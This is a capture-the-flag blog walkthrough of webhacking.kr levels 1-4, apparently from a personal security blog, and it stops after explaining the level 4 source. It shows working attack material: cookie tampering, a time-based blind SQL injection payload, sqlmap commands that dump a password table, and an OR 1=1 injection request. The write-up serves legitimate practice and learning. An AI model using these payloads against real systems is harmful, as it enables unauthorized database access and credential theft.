<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Webhacking.kr Solutions</title>
  <meta name="description" content="This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend.">
  
  <meta name="author" content="Sam Sanoop">
  <meta name="copyright" content="&copy; Sam Sanoop 2022">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
  <meta property="og:description" content="This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend." />
  <meta property="og:url" content="http://snoopysecurity.github.io" />
  <meta property="og:site_name" content="ðŸ’» | Blog" />
  <meta property="og:title" content="Webhacking.kr Solutions" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="http://snoopysecurity.github.io/assets/logo.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" />
  

  
  <!-- Twitter: card tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Webhacking.kr Solutions">
  <meta name="twitter:description" content="This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend.">
  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/logo.png">
  <meta name="twitter:url" content="http://snoopysecurity.github.io">
  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://snoopysecurity.github.io/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html">
  <link rel="alternate" type="application/rss+xml" title="ðŸ’» | Blog" href="http://snoopysecurity.github.io/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="ðŸ’» | Blog">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
        
          
        
          
        
          
          <li class="nav-link"><a href="/posts/">Posts</a>
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container " >
  <div class="scrim ">
    <header class="post-header">
      <h1 class="title">Webhacking.kr Solutions</h1>
      <p class="info">by <strong>snoopysecurity</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">

 <span class="page-divider">
  <span class="one"></span>
  <span class="two"></span>
</span>
 

<section class="post-meta">
  <div class="post-date">April 3, 2020</div>
  <div class="post-categories">
  in 
    
    <a href="/category/capture-the-flag">Capture-the-flag</a>
    
  
  </div>
</section>

<article class="post-content">
  <p>This blog post contains a walk-through of <a href="https://webhacking.kr/">https://webhacking.kr/</a> wargames which was recommended to me by a friend.</p>

<h3 id="level-1">Level 1</h3>

<p>The following can be seen in level 1.</p>

<p><img src="/assets/webhackingkr/1.png" alt="" /></p>

<p>The source code of the backend application can be read by clicking the view source button.</p>

<p><img src="/assets/webhackingkr/1-1.png" alt="" /></p>

<p>A cookie called <code class="highlighter-rouge">user_lv</code> is being set every time the user visits the page which has a numeric value. If this value is more that 6, then the backend application will set it to 1. If this value is more than 5, then the <code class="highlighter-rouge">solve</code> function can be triggered.</p>

<p>This function can be triggered by sending a value such as <code class="highlighter-rouge">5.5</code> which is smaller than <code class="highlighter-rouge">6</code> and is higher than <code class="highlighter-rouge">5</code>.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>GET /challenge/web-01/ HTTP/1.1
Host: webhacking.kr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://webhacking.kr/old.php
Connection: close
Cookie: user_lv=5.5; PHPSESSID=qksuhplclrtd25armt59rkatn6
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

</code></pre>
</div>

<h3 id="level-2">Level 2</h3>

<p>The following can be seen in the HTML markup of the level 2 page.</p>

<p><img src="/assets/webhackingkr/2.png" alt="" /></p>

<p>Looking at the response, a cookie named <code class="highlighter-rouge">time</code> is being set which reflects the date and time value show in the above HTML comment.</p>

<p><img src="/assets/webhackingkr/2-1.png" alt="" /></p>

<p>The presence of SQL Injection can be discovered by trying a query such as <code class="highlighter-rouge">1604695706 AND 1=1</code> which returns true returns the following data: <code class="highlighter-rouge">2070-01-01 09:00:01</code>, and <code class="highlighter-rouge">1604695706 AND 1=2</code> which returns <code class="highlighter-rouge">2070-01-01 09:00:00</code>.</p>

<p>Since the vulnerability is a blind based SQL injection, time-based blind techniques can be used to iterate through characters and compare them with the index of the current database name using an IF statement, and if this statement is true, then the MySQL <code class="highlighter-rouge">sleep</code> function is triggered for 5 seconds. An example of this can be seen below.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1604695706 AND 7678=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;48),SLEEP(5),7678)
</code></pre>
</div>

<p>The same technique can be used to iterate through and extract more data.</p>

<p>SQLMap can be used to automate this process.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6'
</code></pre>
</div>

<p>To get the current database the application is running under, the ` â€“current-db` option can be used which reveals the current database to be â€˜chall2â€™.</p>

<p>SQLMap can then be used to get the tables belonging to this database.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6' -D chall2 --table

Database: chall2
[2 tables]
+---------------+
| admin_area_pw |
| log           |
+---------------+
</code></pre>
</div>

<p>The <code class="highlighter-rouge">--dump</code> option can be used to extract the password.</p>

<p><img src="/assets/webhackingkr/2-2.png" alt="" /></p>

<p>This can be used to complete challenge 2.</p>

<p><img src="/assets/webhackingkr/2-3.png" alt="" /></p>

<h3 id="level-3">Level 3</h3>

<p>Level 3 presents a Nonogram/Sudoku puzzle. This can be read as follows: Horizontally, the last line has 5 black colors, second to last 2 colors etc etc. An example of this can be seen below:</p>

<p><img src="/assets/webhackingkr/3-1.png" alt="" /></p>

<p>After multiple tries, this was found to be the correct answer.</p>

<p><img src="/assets/webhackingkr/3.png" alt="" /></p>

<p>You are then presented with the following form.</p>

<p><img src="/assets/webhackingkr/3-3.png" alt="" /></p>

<p>A hidden parameter exists which is vulnerable to SQL injection, this can be exploited as follows.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>POST /challenge/web-03/index.php HTTP/1.1
Host: webhacking.kr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: https://webhacking.kr
Connection: close
Referer: https://webhacking.kr/challenge/web-03/index.php?_1=1&amp;_2=0&amp;_3=1&amp;_4=0&amp;_5=1&amp;_6=0&amp;_7=0&amp;_8=0&amp;_9=0&amp;_10=0&amp;_11=0&amp;_12=1&amp;_13=1&amp;_14=1&amp;_15=0&amp;_16=0&amp;_17=1&amp;_18=0&amp;_19=1&amp;_20=0&amp;_21=1&amp;_22=1&amp;_23=1&amp;_24=1&amp;_25=1&amp;_answer=1010100000011100101011111
Cookie: PHPSESSID=qksuhplclrtd25armt59rkatn6
Upgrade-Insecure-Requests: 1

answer='+OR+'1'='1&amp;id=SS
</code></pre>
</div>

<p><img src="/assets/webhackingkr/3-4.png" alt="" /></p>

<h3 id="level-4">Level 4</h3>

<p>The following code is presented for Level 4.</p>

<div class="highlighter-rouge"><pre class="highlight"><code> <span class="cp">&lt;?php
  include "../../config.php";
  if($_GET['view-source'] == 1) view_source();
?&gt;</span><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Challenge 4<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
<span class="nt">body</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span><span class="no">black</span><span class="p">;</span> <span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span> <span class="nl">font-size</span><span class="p">:</span><span class="m">9pt</span><span class="p">;</span> <span class="p">}</span>
<span class="nt">table</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span> <span class="nl">font-size</span><span class="p">:</span><span class="m">10pt</span><span class="p">;</span> <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;</span>
<span class="cp">&lt;?php
  sleep(1); // anti brute force
  if((isset($_SESSION['chall4'])) &amp;&amp; ($_POST['key'] == $_SESSION['chall4'])) solve(4);
  $hash = rand(10000000,99999999)."salt_for_you";
  $_SESSION['chall4'] = $hash;
  for($i=0;$i&lt;500;$i++) $hash = sha1($hash);
?&gt;</span><span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">post</span><span class="nt">&gt;</span>
<span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">0</span> <span class="na">align=</span><span class="s">center</span> <span class="na">cellpadding=</span><span class="s">10</span><span class="nt">&gt;</span>
<span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">colspan=</span><span class="s">3</span> <span class="na">style=</span><span class="s">background:silver;color:green;</span><span class="nt">&gt;&lt;b&gt;</span><span class="cp">&lt;?=$hash?&gt;</span><span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="nt">&lt;tr</span> <span class="na">align=</span><span class="s">center</span><span class="nt">&gt;&lt;td&gt;</span>Password<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">name=</span><span class="s">key</span> <span class="na">type=</span><span class="s">text</span> <span class="na">size=</span><span class="s">30</span><span class="nt">&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">submit</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="nt">&lt;/table&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">?view-source=1</span><span class="nt">&gt;</span>[view-source]<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/center&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre>
</div>

<p>The above PHP code takes a number between 10000000 and 99999999 and merges it with <code class="highlighter-rouge">salt_for_you</code>. This value is then encrypted 500 times with the <code class="highlighter-rouge">sha1</code> hashing algorithm.</p>


</article>





<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
      <a href="//twitter.com/share?text=Webhacking.kr+Solutions&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html&via=snoopysecurity"
        onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
        <i class="fa fa-twitter-square fa-lg"></i>
      </a>
    
    
    
    
    
    
    
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Webhacking.kr+Solutions&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html"
        onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
        <i class="fa fa-linkedin-square fa-lg"></i>
      </a>
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
      <a href="//www.pinterest.com/pin/create/button/?description=Webhacking.kr+Solutions&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html&media=http://snoopysecurity.github.io/assets/header_img.jpg"
        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
        <i class="fa fa-pinterest-square fa-lg"></i>
      </a>
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">ðŸ’» | Blog</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
        
        
        
        
        
        
          <li class="nav-link"><a href="/posts/">Posts</a>
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:na">
            <i class="fa fa-envelope-o"></i>
            <span class="username">na</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://twitter.com/snoopysecurity" title="Follow me on Twitter">
              <i class="fa fa-twitter"></i>
              <span class="username">snoopysecurity</span>
            </a>
          </li>
          
        
          
        
          
          <li>
            <a href="https://github.com/snoopysecurity" title="Fork me on GitHub">
              <i class="fa fa-github"></i>
              <span class="username">snoopysecurity</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">Hacking to learn, while learning to hack.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
